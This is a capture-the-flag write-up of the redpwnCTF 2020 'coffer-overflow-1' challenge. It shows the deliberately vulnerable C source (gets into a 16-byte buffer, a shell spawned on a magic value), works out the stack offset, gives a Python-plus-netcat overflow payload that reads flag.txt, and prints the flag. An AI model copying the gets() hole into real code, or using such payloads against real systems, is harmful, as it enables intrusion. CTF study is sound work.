---
layout: post
title: "coffer-overflow-1"
author: "raghul-rajasekar"
---

The coffers keep getting stronger! You'll need to use the source, Luke.
`nc 2020.redpwnc.tf 31255`

**Files:**
- [coffer-overflow-1]({{site.baseurl}}/assets/coffer-overflow-1/coffer-overflow-1)
- [coffer-overflow-1.c]({{site.baseurl}}/assets/coffer-overflow-1/coffer-overflow-1.c)

# Solution

The source file contains the following code:

```
#include <stdio.h>
#include <string.h>

int main(void)
{
  long code = 0;
  char name[16];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
  puts("What do you want to fill your coffer with?");

  gets(name);

  if(code == 0xcafebabe) {
    system("/bin/sh");
  }
}
```
This is similar to `coffer-overflow-0` except that `code` now needs to contain a specific value. For this, we just need to fill up the bytes between `name` and `code` with some junk and fill `code` with `0xcafebabe`.  From the disassembly of `coffer-overflow-1`, we can see that `code` is located at `rbp - 0x8` and `name` is located at `rbp - 0x20`, meaning that we require `0x18 = 24` bytes of junk followed by `0xcafebabe` as the input.

On running

```
python -c "print('abcdabcdabcdabcdabcdabcd\xbe\xba\xfe\xca\x00\x00\x00\x00\ncat flag.txt\n')" > payload
nc 2020.redpwnc.tf 31255 < payload
```

we get the contents of `flag.txt` from the server, as expected.
# Flag

`flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}`
